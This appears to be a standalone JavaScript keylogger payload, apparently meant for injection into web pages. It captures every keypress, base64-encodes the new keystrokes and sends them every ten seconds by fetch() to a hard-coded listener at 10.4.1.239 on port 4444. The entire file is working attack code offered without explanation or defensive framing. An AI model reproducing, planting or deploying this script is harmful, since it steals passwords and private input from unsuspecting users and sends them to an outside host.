const lhost = '10.4.1.239';
const port = '4444';
const interval = 10000
let keys = '';
let sentKeys = '';

document.onkeypress = (e) => {
    keys += e.key;
}

setInterval(() => {
    let sendingKeys = keys.replace(sentKeys, '');
    if(sendingKeys) {
	sentKeys += sendingKeys;
	fetch(`http://${lhost}:${port}?key=` + btoa(sendingKeys));
    }
}, interval)
